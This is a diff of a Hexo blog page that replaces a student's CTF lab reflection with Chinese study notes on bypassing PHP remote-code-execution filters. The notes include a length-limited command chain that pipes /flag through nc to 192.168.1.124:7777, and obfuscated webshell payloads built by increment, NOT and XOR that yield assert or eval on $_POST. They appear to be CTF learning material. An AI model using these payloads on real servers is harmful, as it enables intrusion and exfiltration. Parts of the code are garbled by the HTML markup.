@@ -19,21 +19,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="​    来到CTF实验室一学期学了一些基础知识，怎么说呢，很幸运能够加入实验室，各位同学都平易近人，幽默风趣。当初杨队的ctf宣传深深的吸引了我，敲敲键盘就把人电脑黑了，帅的一批，于是下定决心要加入实验室学web。 ​    国庆也是听老登们讲解各方向基础知识，也想试试我适合什么方向，结果pwn是真的一点没听懂，只会nc。 ​    回来军训也是招新赛，边打边学边军训，结果发现怎么会有观训✌这种">
+    <meta name="description" content="rce一些命令常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec() 无参数函数print_r()、scandir()与highlight_file(‘); 1cat tac more less tail uniq od nl grep sort xxd strings  xx">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF学习心得">
-<meta property="og:url" content="http://example.com/2025/02/22/CTF%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/index.html">
+<meta property="og:title" content="rce">
+<meta property="og:url" content="http://example.com/2025/02/24/rce/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="​    来到CTF实验室一学期学了一些基础知识，怎么说呢，很幸运能够加入实验室，各位同学都平易近人，幽默风趣。当初杨队的ctf宣传深深的吸引了我，敲敲键盘就把人电脑黑了，帅的一批，于是下定决心要加入实验室学web。 ​    国庆也是听老登们讲解各方向基础知识，也想试试我适合什么方向，结果pwn是真的一点没听懂，只会nc。 ​    回来军训也是招新赛，边打边学边军训，结果发现怎么会有观训✌这种">
+<meta property="og:description" content="rce一些命令常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec() 无参数函数print_r()、scandir()与highlight_file(‘); 1cat tac more less tail uniq od nl grep sort xxd strings  xx">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-02-22T06:07:16.000Z">
-<meta property="article:modified_time" content="2025-02-22T07:06:40.120Z">
+<meta property="article:published_time" content="2025-02-24T11:40:35.000Z">
+<meta property="article:modified_time" content="2025-02-24T11:44:39.830Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>CTF学习心得 - Hexo</title>
+  <title>rce - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CTF学习心得"></span>
+            <span id="subtitle" data-typed-text="rce"></span>
           
         </div>
 
@@ -210,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-02-22 14:07" pubdate>
-          2025年2月22日 下午
+        <time datetime="2025-02-24 19:40" pubdate>
+          2025年2月24日 晚上
         </time>
       </span>
     
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          465 字
+          665 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          4 分钟
+          6 分钟
         
       </span>
     
@@ -270,19 +270,129 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">CTF学习心得</h1>
+            <h1 id="seo-header">rce</h1>
             
             
               <div class="markdown-body">
                 
-                <p>​    来到CTF实验室一学期学了一些基础知识，怎么说呢，很幸运能够加入实验室，各位同学都平易近人，幽默风趣。当初杨队的ctf宣传深深的吸引了我，敲敲键盘就把人电脑黑了，帅的一批，于是下定决心要加入实验室学web。</p>
-<p>​    国庆也是听老登们讲解各方向基础知识，也想试试我适合什么方向，结果pwn是真的一点没听懂，只会nc。</p>
-<p>​    回来军训也是招新赛，边打边学边军训，结果发现怎么会有观训✌这种生物啊(悲)，也有两道题在招新赛时百思不得其解，(黑神话)date格式怎么写都不对，最后发现逗号后面少了一个空格。(人类联合之高塔)明文攻击就是爆不出来密码，结果是压缩软件没用对。想起刚学的时候还找谢队问过”Browser是什么””UA是什么”这种问题，现在每次想起都绷不住(当然，招新赛之前问的)。每次看见前五都想说，说好的全是纯小白呢，招新赛偶遇神仙，拼尽全力无法战胜。</p>
-<p>​    每次周赛是既兴奋又担忧，有种进步的兴奋和怕被踢的担忧，还好，至少是留下来了。</p>
-<p>​    写着写着又想到了谢队，偶尔的不正经给大家带来了快乐，实验室内充满了欢快的笑声。</p>
-<p>​    实验室内大家互帮互助，交流学习经验，刚来时都只敢小声说话，极度社恐，现在会求助老登了。</p>
-<p>​    学习上在跟着刘队的安排走，夯实基础</p>
-<p>​    总之，实验室的氛围好，很吸引人，也是团结友爱的大家伙，让人有进步的渴望。</p>
+                <h1 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h1><h2 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h2><p>常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()</p>
+<p>无参数函数print_r()<code>、</code>scandir()<code>与</code>highlight_file(‘);</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> <span class="hljs-built_in">tac</span> more less <span class="hljs-built_in">tail</span> <span class="hljs-built_in">uniq</span> <span class="hljs-built_in">od</span> <span class="hljs-built_in">nl</span> grep <span class="hljs-built_in">sort</span> xxd strings<br></code></pre></td></tr></table></figure>
+
+<p>xxd:读取二进制文件     od:以二进制读取   </p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">grep (查找字段,<span class="hljs-built_in">flag</span>) /<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure>
+
+<p>ob_start函数会接收我们往流里输入的参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;whoami&quot;</span>;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>执行system(‘whoami’)</p>
+<h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><p>前置知识：</p>
+<blockquote>
+<p>和&gt;&gt;：</p>
+</blockquote>
+<blockquote>
+<p>b 类似于touch b，即直接创建文件b，通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容</p>
+</blockquote>
+<p>echo kuai &gt; a  #创建文件a，并把字符串’kuai’写入到文件a里</p>
+<blockquote>
+<blockquote>
+<p>用来追加内容</p>
+</blockquote>
+</blockquote>
+<p>kuai &gt;&gt;a   #在文件a末尾追加字符串’kuai’</p>
+<p>ls -t命令：按时间顺序，由近及远排序（后创建的排在前面，只能精确到秒）</p>
+<p>组合运用示例:<br>#&gt;ag</p>
+<p>#&gt;fl<br>#&gt;”t”<br>#&gt;ca<br>#ls -t<br>ca ‘t ‘ fl ag</p>
+<p>按时间顺序反向依次创建文件，”ca” “‘t “ “fl” “ag”<br>再通过ls -t &gt; x，创建文件x，并把’Is -t执行结果写入文件x里 。</p>
+<p>实际上在创建文件时，加入”&quot;，把命令”ca””t””f””ag”连接起来</p>
+<p>#&gt;ag<br>#fl\<br>#&gt;”t\“<br>#&gt;ca\<br>#ls -t &gt; a       </p>
+<p>前面的‘\’把后面的‘\’实体化变成字符 ，把一段已经拼接好的文件名输出到输出到一个文件a里，然后把这个文件a当成一个脚本去执行</p>
+<p>sh：sh命令是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取</p>
+<p>dir及*：<br>*：相当于$(dir *)</p>
+<p>#dir *<br>echo ffff<br>#$(dir <em>)<br>ffff            &#x2F;&#x2F;执行echo命令输出ffff<br>#</em><br>ffff            &#x2F;&#x2F;执行echo命令输出ffff</p>
+<p>如果第一个文件名是命令的话就会执行命令,返回执行的结果，之后的文件名作为参数传入 </p>
+<p>rev:翻转文件每一行内容</p>
+<p>长度限制为7绕过方法：<br>期望执行的命令：</p>
+<p>cat &#x2F;flag|nc 192.168.1.124 7777   </p>
+<p>cat &#x2F;flag展示内容，再通过nc反弹提交到192.168.1.124:7777，kali的IP地址192.168.1.124监听端口7777 </p>
+<p>去kali把监听打开 ：</p>
+<p>nc -lvp 7777</p>
+<p> 利用逻辑：</p>
+<blockquote>
+<p>创建短的文件名<br>Is -t 按时间顺序列出文件名，按行储存<br>\连接换行命令<br>sh从文件中读取命令</p>
+</blockquote>
+<p>?cmd&#x3D;&gt;7777</p>
+<p>?cmd&#x3D;&gt;\ \</p>
+<p>?cmd&#x3D;&gt;&gt;124\</p>
+<p>?cmd&#x3D;&gt;1.\</p>
+<p>?cmd&#x3D;&gt;168.\</p>
+<p>?cmd&#x3D;&gt;192.\</p>
+<p>?cmd&#x3D;&gt;c\ \</p>
+<p>?cmd&#x3D;&gt;|n\</p>
+<p>?cmd&#x3D;&gt;flag\</p>
+<p>?cmd&#x3D;&gt;t\ \</p>
+<p>?cmd&#x3D;&gt;ca\    #从近往远的文件名能构成命令cat &#x2F;flag|nc 192.168.1.124 7777<br>?cmd&#x3D;ls -t&gt;a   #将文件名按从近往远的顺序写入到文件a</p>
+<h2 id="无数字字母"><a href="#无数字字母" class="headerlink" title="无数字字母"></a>无数字字母</h2><h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><?php
+$_=[].'';   //得到"Array"
+$___ = $_[$__];   //得到"A"，$__没有定义，默认为False也即0，此时$___="A"
+$__ = $___;   //$__="A"
+$_ = $___;   //$_="A"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
+$___ .= $__;   //$___="AS"
+$___ .= $__;   //$___="ASS"
+$__ = $_;   //$__="A"
+$__++;$__++;$__++;$__++;   //得到"E"，此时$__="E"
+$___ .= $__;   //$___="ASSE"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到"R"，此时$__="R"
+$___ .= $__;   //$___="ASSER"
+$__++;$__++;   //得到"T"，此时$__="T"
+$___ .= $__;   //$___="ASSERT"
+$__ = $_;   //$__="A"
+$____ = "_";   //$____="_"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"P"，此时$__="P"
+$____ .= $__;   //$____="_P"
+$__ = $_;   //$__="A"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"O"，此时$__="O"
+$____ .= $__;   //$____="_PO"
+$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
+$____ .= $__;   //$____="_POS"
+$__++;   //得到"T"，此时$__="T"
+$____ .= $__;   //$____="_POST"
+$_ = $$____;   //$_=$_POST
+$___($_[_]);   //ASSERT($POST[_])
+
+
+
+
+
+
+
+ $_=[].[];$_=$_[0];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; $_++;$_++;$_=$___.$__.$_;$_=_.$_;$$_[_]($$_[__]);
+
+
+
+### 取反
+
+脚本
+
+<?php
+echo urlencode(~'取反内容');
+?><p>(<del>%9E%8C%8C%9A%8D%8B)(</del>%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);<br>assert(eval($_POST[1]);)<br>(~%8F%97%8F%96%91%99%90)();</p>
+<p>phpinfo()</p>
+<p><em>(<del>%9E%8C%8C%9A%8D%8B)(</del>%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%93%90%89%9A%A2%D6%D6);</em></p>
+<p>(eval($_POST[love]))</p>
+<p>(<del>%9E%8C%8C%9A%8D%8B)(</del>%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6);</p>
+<p>eval($_POST[cmd])</p>
+<p>(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%D0%99%93%9E%98);</p>
+<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>py3脚本</p>
+<p>def encode(command):<br>    code &#x3D; “~&#96;!@#$%&amp;*()-&#x3D;+_[]{};:&lt;&gt;,.?&#x2F;|”<br>    result_1 &#x3D; “”<br>    result_2 &#x3D; “”</p>
+<p>for x in command:<br>    if not command.isalpha():<br>        result_1 +&#x3D; x<br>        result_2 +&#x3D; x<br>    for y in code:<br>        if chr(ord(x) ^ ord(y)) in code:<br>            result_1 +&#x3D; y<br>            result_2 +&#x3D; chr(ord(x) ^ ord(y))<br>            break<br>return f’(“{result_1}” ^ “{result_2}”)’ </p>
+<p>a&#x3D;encode(‘ls’)<br>print(a)</p>
+<h3 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h3><h2 id="全角绕过"><a href="#全角绕过" class="headerlink" title="全角绕过"></a>全角绕过</h2><p>ａｂｃｄｅｆｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ</p>
+<p>ＡＢＣＤＥＦＧＨＩＪＫＬＭＮＯＰＱＲＳＴＵＶＷＸＹＺ</p>
+<p>｀～！＠＃＄％＾＆＊（）＿＋＝－｛｝［］：＂；＇＼｜＜＞？，．／，。</p>
+<p>１２３４５６７８９０</p>
+<p>popen和执行的命令不得使用全角英文</p>
 
                 
               </div>
@@ -300,8 +410,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CTF学习心得</div>
-      <div>http://example.com/2025/02/22/CTF学习心得/</div>
+      <div>rce</div>
+      <div>http://example.com/2025/02/24/rce/</div>
     </div>
     <div class="license-meta">
       
@@ -313,7 +423,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年2月22日</div>
+          <div>2025年2月24日</div>
         </div>
       
       
@@ -345,18 +455,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/02/24/sql/" title="笔记">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">笔记</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/02/22/hello-world/" title="Hello World">
-                        <span class="hidden-mobile">Hello World</span>
+                      <a href="/2025/02/24/sql/" title="笔记">
+                        <span class="hidden-mobile">笔记</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
